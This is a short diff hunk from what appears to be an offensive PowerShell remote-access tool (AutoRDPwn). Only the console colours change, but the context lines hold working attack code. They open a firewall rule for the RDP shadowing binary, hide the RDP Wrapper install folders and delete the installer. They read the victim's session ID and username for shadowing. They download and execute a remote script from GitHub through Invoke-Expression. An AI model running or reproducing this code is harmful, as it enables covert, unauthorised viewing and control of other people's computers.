@@ -622,7 +622,7 @@ if($Language -in 'Spanish') {
     netsh advfirewall firewall add rule name="$using:Pwn6" dir=in protocol=tcp action=allow program="C:\Windows\System32\rdpsa.exe" enable=yes 2>&1> $null
     attrib +h 'C:\Program Files\RDP Wrapper' 2>&1> $null ; attrib +h 'C:\Program Files (x86)\RDP Wrapper' 2>&1> $null ; sleep -milliseconds 7500 ; rm .\RDPWInst-v1.6.2.msi 2>&1> $null }
 
-    $shadow = invoke-command -session $RDP[0] -scriptblock { (Get-Process explorer).SessionId } ; $Host.UI.RawUI.ForegroundColor = 'Green' ; Write-Host ; Write-Host "$txt35" -ForegroundColor Blue ; sleep -milliseconds 2500
+    $shadow = invoke-command -session $RDP[0] -scriptblock { (Get-Process explorer).SessionId } ; $Host.UI.RawUI.ForegroundColor = 'Blue' ; Write-Host ; Write-Host "$txt35" ; sleep -milliseconds 2500
     $remoteusername = invoke-command -session $RDP[0] -scriptblock { (Get-Process explorer -IncludeUserName).username.split("\")[1].trim("") } 
     Write-Host ; Write-Host "$txt66" -NoNewLine ; Write-Host $remoteusername -ForegroundColor White -NoNewLine ;  Write-Host "$txt67" -NoNewLine ; Write-Host $shadow -ForegroundColor White ; sleep -milliseconds 1500
     if($vncserver){ Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Invoke-VNCViewer.ps1')
